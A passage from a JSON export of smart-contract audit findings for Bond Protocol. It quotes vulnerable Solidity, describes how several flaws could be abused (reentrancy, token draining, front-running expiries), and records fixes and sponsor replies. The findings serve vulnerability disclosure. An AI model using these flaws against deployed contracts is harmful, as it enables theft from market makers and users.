Review\n\n## Recommendation\n\nConsider implementing an additional function to allow the removal of an Auctioneer from the whitelist, so that vulnerable Auctioneer can be removed swiftly if needed.\n\n```solidity\nfunction deregisterAuctioneer(IBondAuctioneer auctioneer_) external requiresAuth {\n    // Remove the auctioneer from the whitelist\n    _whitelist[address(auctioneer_)] = false;\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nWe acknowledge that a whitelisted Auctioneer cannot be removed from the Aggregator. Auctioneers can be sunset by disallowing new markets to be created. Adding a function to remove a whitelisted auctioneer would effectively give the protocol the ability to shutdown live, user-created markets, which goes against the goal of a permissionless system. Users have the ability to close their own markets if needed.",
      "summary": "\nThis bug report is about an issue where an Auctioneer cannot be removed from the protocol. The protocol is missing the feature to remove an auctioneer, which means once an auctioneer has been added to the whitelist, it is not possible to remove it. This could lead to a vulnerable Auctioneer being exploited by an attacker, and the protocol team would need to find a workaround to block the attack. Additionally, if an admin accidentally whitelisted the wrong Auctioneer, there is no way to remove it. The recommendation is to implement a function to allow the removal of an Auctioneer from the whitelist, so that vulnerable Auctioneers can be removed swiftly if needed. The sponsor has commented that adding such a function would go against the goal of a permissionless system, and users have the ability to close their own markets if needed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/13",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "5676",
      "title": "M-8: `BondAggregator.findMarketFor` Function Will Break In Certain Conditions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/14 \n\n## Found by \nxiaoming90\n\n## Summary\n\n`BondAggregator.findMarketFor` function will break when the `BondBaseSDA.payoutFor` function within the for-loop reverts under certain conditions.\n\n## Vulnerability Detail\n\nThe `BondBaseSDA.payoutFor` function will revert if the computed payout is larger than the market's max payout. Refer to Line 711 below.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L699\n\n```solidity\nFile: BondBaseSDA.sol\n699:     function payoutFor(\n700:         uint256 amount_,\n701:         uint256 id_,\n702:         address referrer_\n703:     ) public view override returns (uint256) {\n704:         // Calculate the payout for the given amount of tokens\n705:         uint256 fee = amount_.mulDiv(_teller.getFee(referrer_), 1e5);\n706:         uint256 payout = (amount_ - fee).mulDiv(markets[id_].scale, marketPrice(id_));\n707: \n708:         // Check that the payout is less than or equal to the maximum payout,\n709:         // Revert if not, otherwise return the payout\n710:         if (payout > markets[id_].maxPayout) {\n711:             revert Auctioneer_MaxPayoutExceeded();\n712:         } else {\n713:             return payout;\n714:         }\n715:     }\n```\n\nThe `BondAggregator.findMarketFor` function will call the `BondBaseSDA.payoutFor` function at Line 245. The `BondBaseSDA.payoutFor` function will revert if the final computed payout is larger than the `markets[id_].maxPayout` as mentioned earlier. This will cause the entire for-loop to \"break\" and the transaction to revert.\n\nAssume that the user configures the `minAmountOut_` to be `0`, then the condition `minAmountOut_ <= maxPayout`  Line 244 will always be true. The `amountIn_` will always be passed to the `payoutFor` function. In some markets where the computed payout is larger than the market's max payout, the `BondAggregator.findMarketFor` function will revert.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L221\n\n```solidity\nFile: BondAggregator.sol\n220:     /// @inheritdoc IBondAggregator\n221:     function findMarketFor(\n222:         address payout_,\n223:         address quote_,\n224:         uint256 amountIn_,\n225:         uint256 minAmountOut_,\n226:         uint256 maxExpiry_\n227:     ) external view returns (uint256) {\n228:         uint256[] memory ids = marketsFor(payout_, quote_);\n229:         uint256 len = ids.length;\n230:         uint256[] memory payouts = new uint256[](len);\n231: \n232:         uint256 highestOut;\n233:         uint256 id = type(uint256).max; // set to max so an empty set doesn't return 0, the first index\n234:         uint48 vesting;\n235:         uint256 maxPayout;\n236:         IBondAuctioneer auctioneer;\n237:         for (uint256 i; i < len; ++i) {\n238:             auctioneer = marketsToAuctioneers[ids[i]];\n239:             (, , , , vesting, maxPayout) = auctioneer.getMarketInfoForPurchase(ids[i]);\n240: \n241:             uint256 expiry = (vesting <= MAX_FIXED_TERM) ? block.timestamp + vesting : vesting;\n242: \n243:             if (expiry <= maxExpiry_) {\n244:                 payouts[i] = minAmountOut_ <= maxPayout\n245:                     ? payoutFor(amountIn_, ids[i], address(0))\n246:                     : 0;\n247: \n248:                 if (payouts[i] > highestOut) {\n249:                     highestOut = payouts[i];\n250:                     id = ids[i];\n251:                 }\n252:             }\n253:         }\n254: \n255:         return id;\n256:     }\n```\n\n## Impact\n\nThe find market feature within the protocol is broken under certain conditions. As such, users would not be able to obtain the list of markets that meet their requirements. The market makers affected by this issue will lose the opportunity to sell their bond tokens.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L699\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondAggregator.sol#L221\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using try-catch or address.call to handle the revert of the `BondBaseSDA.payoutFor` function within the for-loop gracefully. This ensures that a single revert of the `BondBaseSDA.payoutFor` function will not affect the entire for-loop within the `BondAggregator.findMarketFor` function.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this finding. We implemented the try-catch suggestion without the `findMarketFor` for loop to silently handle these errors while still preserving the error for other uses.\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/56a11260c40785509215b8c81830f6270b46d15f",
      "summary": "\nBug report M-8 has been identified by xiaoming90, which is related to the `BondAggregator.findMarketFor` function. This function will break when the `BondBaseSDA.payoutFor` function within the for-loop reverts under certain conditions. The `BondBaseSDA.payoutFor` function will revert if the computed payout is larger than the market's max payout, which is mentioned in the code snippet of the report. The `BondAggregator.findMarketFor` function will call the `BondBaseSDA.payoutFor` function at Line 245. This will cause the entire for-loop to \"break\" and the transaction to revert.\n\nThe impact of this bug is that the find market feature within the protocol is broken under certain conditions, meaning that users would not be able to obtain the list of markets that meet their requirements. The market makers affected by this issue will lose the opportunity to sell their bond tokens.\n\nThe recommendation for this bug is to consider using try-catch or address.call to handle the revert of the `BondBaseSDA.payoutFor` function within the for-loop gracefully. This ensures that a single revert of the `BondBaseSDA.payoutFor` function will not affect the entire for-loop within the `BondAggregator.findMarketFor` function.\n\nThe bug has been fixed in the commit https://github.com/Bond-Protocol/bonds/commit/56a11260c40785509215b8c81830f6270b46d15f.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/14",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "5675",
      "title": "M-7: Create Fee Discount Feature Is Broken",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/16 \n\n## Found by \n8olidity, xiaoming90\n\n## Summary\n\n The create fee discount feature is found to be broken within the protocol. \n\n## Vulnerability Detail\n\nThe create fee discount feature relies on the `createFeeDiscount` state variable to determine the fee to be discounted from the protocol fee. However, it was observed that there is no way to initialize the `createFeeDiscount` state variable. As a result, the `createFeeDiscount` state variable will always be zero.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedExpiryTeller.sol#L118\n\n```solidity\nFile: BondFixedExpiryTeller.sol\n118:         // If fee is greater than the create discount, then calculate the fee and store it\n119:         // Otherwise, fee is zero.\n120:         if (protocolFee > createFeeDiscount) {\n121:             // Calculate fee amount\n122:             uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n123:             rewards[_protocol][underlying_] += feeAmount;\n124: \n125:             // Mint new bond tokens\n126:             bondToken.mint(msg.sender, amount_ - feeAmount);\n127: \n128:             return (bondToken, amount_ - feeAmount);\n129:         } else {\n130:             // Mint new bond tokens\n131:             bondToken.mint(msg.sender, amount_);\n132: \n133:             return (bondToken, amount_);\n134:         }\n```\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L118\n\n```solidity\nFile: BondFixedTermTeller.sol\n118:         // If fee is greater than the create discount, then calculate the fee and store it\n119:         // Otherwise, fee is zero.\n120:         if (protocolFee > createFeeDiscount) {\n121:             // Calculate fee amount\n122:             uint256 feeAmount = amount_.mulDiv(protocolFee - createFeeDiscount, FEE_DECIMALS);\n123:             rewards[_protocol][underlying_] += feeAmount;\n124: \n125:             // Mint new bond tokens\n126:             _mintToken(msg.sender, tokenId, amount_ - feeAmount);\n127: \n128:             return (tokenId, amount_ - feeAmount);\n129:         } else {\n130:             // Mint new bond tokens\n131:             _mintToken(msg.sender, tokenId, amount_);\n132: \n133:             return (tokenId, amount_);\n134:         }\n```\n\n## Impact\n\n The create fee discount feature is broken within the protocol. There is no way for the protocol team to configure a discount for the users of the `BondFixedExpiryTeller.create` and `BondFixedTermTeller.create` functions. As such, the users will not obtain any discount from the protocol when using the create function.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedExpiryTeller.sol#L118\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L118\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nImplement a setter method for the `createFeeDiscount` state variable and the necessary verification checks.\n\n```solidity\nfunction setCreateFeeDiscount(uint48 createFeeDiscount_) external requiresAuth {\n    if (createFeeDiscount_ > protocolFee)  revert Teller_InvalidParams();\n    if (createFeeDiscount_ > 5e3) revert Teller_InvalidParams();\n    createFeeDiscount = createFeeDiscount_;\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree. We implemented a `setCreateFeeDiscount` function on the BondBaseTeller to allow updating the create fee discount.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/570eb0b74b2401c7b6d07a30f8dd452bf7f225f9",
      "summary": "\nIssue M-7 is a bug found in the Bond Protocol's create fee discount feature. The issue was identified by 8olidity and xiaoming90, and it was found that the `createFeeDiscount` state variable is not initialized, meaning that users of the `BondFixedExpiryTeller.create` and `BondFixedTermTeller.create` functions will not receive any discount from the protocol. The code snippets from the BondFixedExpiryTeller.sol and BondFixedTermTeller.sol files were provided to illustrate the issue. The issue was identified through manual review. The recommended solution was to implement a setter method for the `createFeeDiscount` state variable and the necessary verification checks. The issue was then fixed by Bond-Protocol in the commit 570eb0b74b2401c7b6d07a30f8dd452bf7f225f9.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/16",
      "tags": [],
      "finders": [
        "8olidity",
        "xiaoming90"
      ]
    },
    {
      "id": "5674",
      "title": "M-6: Teller Cannot Be Removed From Callback Contract",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/18 \n\n## Found by \nxiaoming90\n\n## Summary\n\nIf a vulnerable Teller is being exploited by an attacker, there is no way for the owner of the Callback Contract to remove the vulnerable Teller from their Callback Contract.\n\n## Vulnerability Detail\n\nThe Callback Contract is missing the feature to remove a Teller. Once a Teller has been added to the whitelist (`approvedMarkets` mapping), it is not possible to remove the Teller from the whitelist.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseCallback.sol#L59\n\n```solidity\nFile: BondBaseCallback.sol\n56:     /* ========== WHITELISTING ========== */\n57: \n58:     /// @inheritdoc IBondCallback\n59:     function whitelist(address teller_, uint256 id_) external override onlyOwner {\n60:         // Check that the market id is a valid, live market on the aggregator\n61:         try _aggregator.isLive(id_) returns (bool live) {\n62:             if (!live) revert Callback_MarketNotSupported(id_);\n63:         } catch {\n64:             revert Callback_MarketNotSupported(id_);\n65:         }\n66: \n67:         // Check that the provided teller is the teller for the market ID on the stored aggregator\n68:         // We could pull the teller from the aggregator, but requiring the teller to be passed in\n69:         // is more explicit about which contract is being whitelisted\n70:         if (teller_ != address(_aggregator.getTeller(id_))) revert Callback_TellerMismatch();\n71: \n72:         approvedMarkets[teller_][id_] = true;\n73:     }\n```\n\n## Impact\n\nIn the event that a whitelisted Teller is found to be vulnerable and has been actively exploited by an attacker in the wild, the owner of the Callback Contract needs to mitigate the issue swiftly by removing the vulnerable Teller from the Callback Contract to stop it from draining the asset within the Callback Contract. However, the mitigation effort will be hindered by the fact there is no way to remove a Teller within the Callback Contract once it has been whitelisted. Thus, it might not be possible to stop the attacker from exploiting the vulnerable Teller to drain assets within the Callback Contract. The Callback Contract owners would need to find a workaround to block the attack, which will introduce an unnecessary delay to the recovery process where every second counts.\n\nAdditionally, if the owner accidentally whitelisted the wrong Teller, there is no way to remove it.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseCallback.sol#L59\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider implementing an additional function to allow the removal of a Teller from the whitelist (`approvedMarkets` mapping), so that a vulnerable Teller can be removed swiftly if needed.\n\n```solidity\nfunction removeFromWhitelist(address teller_, uint256 id_) external override onlyOwner {\n    approvedMarkets[teller_][id_] = false;\n}\n```\n\nNote: Although the owner of the Callback Contract can DOS its own market by abusing the `removeFromWhitelist` function, no sensible owner would do so.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this issue. We implemented a `blacklist()` function on the BondBaseCallback.sol contract to allow removing a teller and market ID combination from using the callback.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/368e6c5b120d9fc44c59cc21d33ee51728728067",
      "summary": "\nThis bug report is about an issue in the Callback Contract that does not allow the owner to remove a Teller from the whitelist. This is a problem because if a vulnerable Teller is being exploited by an attacker, there is no way for the owner of the Callback Contract to remove the vulnerable Teller, which can lead to assets within the Callback Contract being drained. Additionally, if the owner accidentally whitelisted the wrong Teller, there is no way to remove it. \n\nThe issue was found by xiaoming90 through manual review. The code snippet provided shows the whitelist function in the BondBaseCallback.sol contract and the absence of a removeFromWhitelist function. \n\nThe recommendation is to consider implementing an additional function to allow the removal of a Teller from the whitelist (`approvedMarkets` mapping), so that a vulnerable Teller can be removed swiftly if needed. The code snippet for the proposed removeFromWhitelist function is also provided.\n\nEvert0x agreed with the issue and mentioned that they have implemented a `blacklist()` function on the BondBaseCallback.sol contract to allow removing a teller and market ID combination from using the callback. The issue was then fixed by xiaoming9090 in a commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/18",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "5673",
      "title": "M-5: Market Price Lower Than Expected",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/20 \n\n## Found by \nxiaoming90\n\n## Summary\n\nThe market price does not conform to the specification documented within the whitepaper. As a result, the computed market price is lower than expected.\n\n## Vulnerability Detail\n\nThe following definition of the market price is taken from the whitepaper. Taken from Page 13 of the whitepaper - Definition 25\n\n![image-20221114132609169](https://user-images.githubusercontent.com/102820284/201850739-496a5e30-bb92-40e3-acfc-6d46821a4eab.png)\n\nThe integer implementation of the market price must be rounded up per the whitepaper. This ensures that the integer implementation of the market price is greater than or equal to the real value of the market price so as to protect makers from selling tokens at a lower price than expected.\n\nWithin the `BondBaseSDA.marketPrice` function, the computation of the market price is rounded up in Line 688, which conforms to the specification.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L687\n\n```solidity\nFile: BondBaseSDA.sol\n687:     function marketPrice(uint256 id_) public view override returns (uint256) {\n688:         uint256 price = currentControlVariable(id_).mulDivUp(currentDebt(id_), markets[id_].scale);\n689: \n690:         return (price > markets[id_].minPrice) ? price : markets[id_].minPrice;\n691:     }\n```\n\nHowever, within the `BondBaseSDA._currentMarketPrice` function, the market price is rounded down, resulting in the makers selling tokens at a lower price than expected.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L631\n\n```solidity\nFile: BondBaseSDA.sol\n631:     function _currentMarketPrice(uint256 id_) internal view returns (uint256) {\n632:         BondMarket memory market = markets[id_];\n633:         return terms[id_].controlVariable.mulDiv(market.totalDebt, market.scale);\n634:     }\n```\n\n## Impact\n\nLoss for the makers as their tokens are sold at a lower price than expected.\n\nAdditionally, the affected `BondBaseSDA._currentMarketPrice` function is used within the `BondBaseSDA._decayAndGetPrice` function to derive the market price. Since a lower market price will be returned, this will lead to a higher amount of payout tokens. Subsequently, the `lastDecayIncrement` will be higher than expected, which will lead to a lower `totalDebt`. Lower debt means a lower market price will be computed later.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L687\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L631\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEnsure the market price is rounded up so that the desired property can be achieved and the makers will not be selling tokens at a lower price than expected.\n\n```diff\nfunction _currentMarketPrice(uint256 id_) internal view returns (uint256) {\n    BondMarket memory market = markets[id_];\n-   return terms[id_].controlVariable.mulDiv(market.totalDebt, market.scale);\n+   return terms[id_].controlVariable.mulDivUp(market.totalDebt, market.scale);\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this issue. We have updated the price calculation in `_currentMarketPrice()` to round up to match the specification.\n\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/a77f0150dd4bf401a1b30c16eca4865bb69c59d3",
      "summary": "\nThis bug report is about an issue found by xiaoming90 in the Bond protocol, where the market price does not conform to the specification documented in the whitepaper. The integer implementation of the market price must be rounded up per the whitepaper to protect makers from selling tokens at a lower price than expected. The code in `BondBaseSDA.marketPrice` function rounds up the computed market price, however, the code in `BondBaseSDA._currentMarketPrice` function rounds down, resulting in the makers selling tokens at a lower price than expected. This leads to a loss for the makers, as well as a higher amount of payout tokens and a lower `totalDebt`.\n\nThe bug was fixed by updating the price calculation in `_currentMarketPrice()` to round up to match the specification. The bug was fixed in the commit https://github.com/Bond-Protocol/bonds/commit/a77f0150dd4bf401a1b30c16eca4865bb69c59d3. To avoid this issue in the future, it is recommended that the market price is rounded up so that the desired property can be achieved and the makers will not be selling tokens at a lower price than expected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/20",
      "tags": [],
      "finders": [
        "xiaoming90"
      ]
    },
    {
      "id": "5672",
      "title": "M-4: Existing Circuit Breaker Implementation Allow Faster Taker To Extract Payout Tokens From Market",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/21 \n\n## Found by \nhansfriese, xiaoming90\n\n## Summary\n\nThe current implementation of the circuit breaker is not optimal. Thus, the market maker will lose an excessive amount of payout tokens if a quoted token suddenly loses a large amount of value, even with a circuit breaker in place.\n\n## Vulnerability Detail\n\nWhen the amount of the payout tokens purchased by the taker exceeds the `term.maxDebt`, the taker is still allowed to carry on with the transaction, and the market will only be closed after the current transaction is completed.\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L427\n\n```solidity\nFile: BondBaseSDA.sol\n426:         // Circuit breaker. If max debt is breached, the market is closed\n427:         if (term.maxDebt < market.totalDebt) {\n428:             _close(id_);\n429:         } else {\n430:             // If market will continue, the control variable is tuned to to expend remaining capacity over remaining market duration\n431:             _tune(id_, currentTime, price);\n432:         }\n```\n\nAssume that the state of the SDAM at T0 is as follows:\n\n-  `term.maxDebt` is 110 (debt buffer = 10%)\n-  `maxPayout` is 100\n- `market.totalDebt` is 99\n\nAssume that the quoted token suddenly loses a large amount of value (e.g. stablecoin depeg causing the quote token to drop to almost zero). Bob decided to purchase as many payout tokens as possible before reaching the `maxPayout` limit to maximize the value he could extract from the market. Assume that Bob is able to purchase 50 bond tokens at T1 before reaching the `maxPayout` limit. As such, the state of the SDAM at T1 will be as follows:\n\n- `term.maxDebt` = 110\n- `maxPayout` = 100\n- `market.totalDebt` = 99 + 50 = 149\n\nIn the above scenario, Bob's purchase has already breached the `term.maxDebt` limit. However, he could still purchase the 50 bond tokens in the current transaction.\n\n## Impact\n\nIn the event that the price of the quote token falls to almost zero (e.g. 0.0001 dollars), then the fastest taker will be able to extract as many payout tokens as possible before reaching the `maxPayout` limit from the market. The extracted payout tokens are essentially free for the fastest taker. Taker gain is maker loss.\n\nAdditionally, in the event that a quoted token suddenly loses a large amount of value, the amount of payout tokens lost by the market marker is capped at the `maxPayout` limit instead of capping the loss at the `term.maxDebt` limit. This resulted in the market makers losing more payout tokens than expected, and their payout tokens being sold to the takers at a very low price (e.g. 0.0001 dollars).\n\nThe market makers will suffer more loss if the `maxPayout` limit of their markets is higher.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-bond/blob/main/src/bases/BondBaseSDA.sol#L427\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsidering only allowing takers to purchase bond tokens up to the `term.maxDebt` limit.\n\nFor instance, based on the earlier scenario, only allow Bob to purchase up to 11 bond tokens (term.maxDebt[110] - market.totalDebt[99]) instead of allowing him to purchase 50 bond tokens. \n\nIf Bob attempts to purchase 50 bond tokens, the market can proceed to purchase the 11 bond tokens for Bob, and the remaining quote tokens can be refunded back to Bob. After that, since the `term.maxDebt (110) == market.totalDebt (110)`, the market can trigger the circuit breaker to close the market to protect the market from potential extreme market conditions. \n\nThis ensures that bond tokens beyond the `term.maxDebt` limit would not be sold to the taker during extreme market conditions.\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nWe acknowledge that this can be an issue in an edge case, but do not believe it is a High severity issue. Specifically, it requires a quote token to rapidly collapse in value AND a market to be configured with a large maxPayout (i.e. long deposit interval). Additionally, the potential updates (limiting purchase amount, reverting the transaction) have their own issues. Reverting the transaction will leave the market open, allow a retry transaction with a smaller amount, and have the price continue decaying (perhaps allowing additional buys) if the owner doesn't recognize the issue and close the market. Limiting the purchase amount requires a large amount of refactoring and would introduce additional gas costs for the checks required. We do not believe protecting from the edge case warrants the additional costs.\n\n**Evert0x**\n\nDowngrading to medium because of comment from protocol",
      "summary": "\nThis bug report is about an existing implementation of a circuit breaker that allows a faster taker to extract payout tokens from the market. The current implementation is not optimal, meaning the market maker will lose an excessive amount of payout tokens if a quoted token suddenly loses a large amount of value, even with a circuit breaker in place. In this situation, the taker is still allowed to carry on with the transaction, and the market will only be closed after the current transaction is completed. \n\nThe impact of this is that the fastest taker will be able to extract as many payout tokens as possible before reaching the `maxPayout` limit from the market. The extracted payout tokens are essentially free for the fastest taker, resulting in taker gain and maker loss. Additionally, the amount of payout tokens lost by the market marker is capped at the `maxPayout` limit instead of capping the loss at the `term.maxDebt` limit. This results in the market makers losing more payout tokens than expected, and their payout tokens being sold to the takers at a very low price.\n\nThe recommendation is to consider only allowing takers to purchase bond tokens up to the `term.maxDebt` limit. For instance, if a taker attempts to purchase more than the limit, the market can proceed to purchase the allowed amount for the taker and refund the remaining quote tokens back to the taker. After that, since the `term.maxDebt (110) == market.totalDebt (110)`, the market can trigger the circuit breaker to close the market to protect the market from potential extreme market conditions. This ensures that bond tokens beyond the `term.maxDebt` limit would not be sold to the taker during extreme market conditions.\n\nThe bug report has been downgraded to medium severity due to a comment from the protocol.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/21",
      "tags": [],
      "finders": [
        "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/21",
        "hansfriese",
        "xiaoming90"
      ]
    },
    {
      "id": "3759",
      "title": "M-3: Read-only reentrancy in BondFixedTermTeller",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/23 \n\n## Found by \nZarf\n\n## Summary\n\nWhen minting new ERC1155 bonds in the `BondFixedTermTeller` contract, the total supply of this specific bond is updated after the new bonds are sent to the recipient, which introduces a reentrancy attack.\n\n## Vulnerability Detail\n\nWhenever a new ERC1155 bond is minted in the `BondFixedTermTeller` contract, either through `_handlePayout()` or `create()`, the total supply is updated after the bond has been minted. \n\nERC1155 tokens will perform a callback to the recipient in case the recipient implements the `ERC1155TokenReceiver` interface. Therefore, the recipient (`msg.sender` in `create()` or `recipient_` in `_handlePayout()` ) is able to perform a call to an arbitrary contract before the total supply of the bonds is updated.\n\nWhile the recipient could enter the current `BondFixedTermTeller` contract to call any function, there is no interesting function which might result in financial loss in case it gets called in the callback. Alternatively, the recipient could enter a smart contract which uses the the public mapping `tokenMetadata` in `BondFixedTermTeller` to calculate the current bond price based on the supply. As the supply is not yet updated, but the tokens are minted, this might result in a miscalculation of the price.\n\n## Impact\n\nWhile the `BondFixedTermTeller` contract itself is not at risk, any protocols integrating with `BondFixedTermTeller` and using the total supply of the ERC1155 bond token to calculate the price, might come at risk.\n\n## Code Snippet\n\n[https://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L218-L225](https://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L218-L225)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUpdate the total supply and mint the tokens afterwards:\n\n```solidity\nfunction _mintToken(\n    address to_,\n    uint256 tokenId_,\n    uint256 amount_\n) internal {\n    tokenMetadata[tokenId_].supply += amount_;\n    _mint(to_, tokenId_, amount_, bytes(\"\"));\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this issue. We updated the `_mintToken()` and `_burnToken()` functions to update supply prior to minting/burning tokens to avoid the reentrancy issue.\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/fafd81d04d685d15612cc56af635513e11ddc626",
      "summary": "\nA bug was identified in the BondFixedTermTeller contract, which is part of the Bond Protocol, by a manual review conducted by Zarf. This bug allows a reentrancy attack when minting new ERC1155 bonds. Whenever a new bond is minted, the total supply is updated after the bond has been sent to the recipient and the recipient can perform a call to an arbitrary contract before the total supply is updated. This could lead to a miscalculation of the price as the supply is not yet updated but the tokens are minted. \n\nThe BondFixedTermTeller contract itself is not at risk, but any protocols integrating with it and using the total supply of the ERC1155 bond token to calculate the price, might come at risk. To fix this bug, the total supply and mint the tokens afterwards should be updated. The bug was fixed in the Bond Protocol with a commit to the GitHub repository.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/23",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "Zarf"
      ]
    },
    {
      "id": "3758",
      "title": "M-2: Fixed Term Bond tokens can be minted with non-rounded expiry",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/32 \n\n## Found by \nobront\n\n## Summary\n\nFixed Term Tellers intend to mint tokens that expire once per day, to consolidate liquidity and create a uniform experience. However, this rounding is not enforced on the external `deploy()` function, which allows for tokens expiring at unexpected times.\n\n## Vulnerability Detail\n\nIn `BondFixedTermTeller.sol`, new tokenIds are deployed through the `_handlePayout()` function. The function calculates the expiry (rounded down to the nearest day), uses this expiry to create a tokenId, and — if that tokenId doesn't yet exist — deploys it.\n\n```solidity\n...\nexpiry = ((vesting_ + uint48(block.timestamp)) / uint48(1 days)) * uint48(1 days);\n\n// Fixed-term user payout information is handled in BondTeller.\n// Teller mints ERC-1155 bond tokens for user.\nuint256 tokenId = getTokenId(payoutToken_, expiry);\n\n// Create new bond token if it doesn't exist yet\nif (!tokenMetadata[tokenId].active) {\n    _deploy(tokenId, payoutToken_, expiry);\n}\n...\n```\nThis successfully consolidates all liquidity into one daily tokenId, which expires (as expected) at the time included in the tokenId.\n\nHowever, if the `deploy()` function is called directly, no such rounding occurs:\n\n```solidity\nfunction deploy(ERC20 underlying_, uint48 expiry_)\n    external\n    override\n    nonReentrant\n    returns (uint256)\n{\n    uint256 tokenId = getTokenId(underlying_, expiry_);\n    // Only creates token if it does not exist\n    if (!tokenMetadata[tokenId].active) {\n        _deploy(tokenId, underlying_, expiry_);\n    }\n    return tokenId;\n}\n```\nThis creates a mismatch between the tokenId time and the real expiry time, as tokenId is calculated by rounding the expiry down to the nearest day:\n```solidity\nuint256 tokenId = uint256(\n    keccak256(abi.encodePacked(underlying_, expiry_ / uint48(1 days)))\n);\n```\n... while the `_deploy()` function saves the original expiry:\n```solidity\ntokenMetadata[tokenId_] = TokenMetadata(\n    true,\n    underlying_,\n    uint8(underlying_.decimals()),\n    expiry_,\n    0\n);\n```\n\n## Impact\n\nThe `deploy()` function causes a number of issues:\n1) Tokens can be deployed that don't expire at the expected daily time, which may cause issues with your front end or break user's expectations\n2) Tokens can expire at times that don't align with the time included in the tokenId\n3) Malicious users can pre-deploy tokens at future timestamps to \"take over\" the token for a given day and lock it at a later time stamp, which then \"locks in\" that expiry time and can't be changed by the 